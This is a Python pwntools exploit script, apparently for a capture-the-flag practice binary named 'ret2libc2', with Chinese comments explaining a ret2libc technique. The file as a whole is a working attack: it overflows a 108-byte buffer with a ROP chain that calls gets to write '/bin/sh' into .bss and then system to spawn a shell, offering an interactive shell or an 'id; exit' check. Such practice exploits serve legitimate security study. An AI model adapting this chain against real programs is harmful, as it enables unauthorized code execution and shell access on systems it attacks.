#!/usr/bin/env python3
"""ret2libc2：有 system@plt，但程序里没有 "/bin/sh"

思路：先调用 gets(target) 把 "/bin/sh" 写进 .bss，再调用 system(target)。
"""
import sys

from pwn import context, ELF, p32, process, ROP

context(os="linux", arch="i386", log_level="error")

BINARY = "./ret2libc2"
CHECK = "--check" in sys.argv
OFFSET = 108


def main() -> int:
    elf = ELF(BINARY, checksec=False)
    system_plt = elf.plt["system"]
    gets_plt = elf.plt["gets"]
    target = elf.symbols["target"]
    pop_ebx = ROP(elf).find_gadget(["pop ebx", "ret"]).address

    chain = b"".join(
        [
            p32(gets_plt), p32(pop_ebx), p32(target),       # gets(target)，返回后 pop 掉参数
            p32(system_plt), p32(0xDEADBEEF), p32(target),  # system(target)
        ]
    )
    payload = b"A" * OFFSET + chain

    p = process(BINARY)
    p.recvuntil(b"input:")
    p.sendline(payload)
    p.sendline(b"/bin/sh")  # 供 gets 读取

    if not CHECK:
        p.interactive()
        return 0

    p.sendline(b"id; exit")
    out = p.recvall(timeout=3)
    ok = b"uid=" in out
    print(
        f"[ret2libc2] {'PASS' if ok else 'FAIL'}  "
        f"gets@plt={gets_plt:#x} pop_ebx={pop_ebx:#x} "
        f"system@plt={system_plt:#x} target={target:#x}"
    )
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())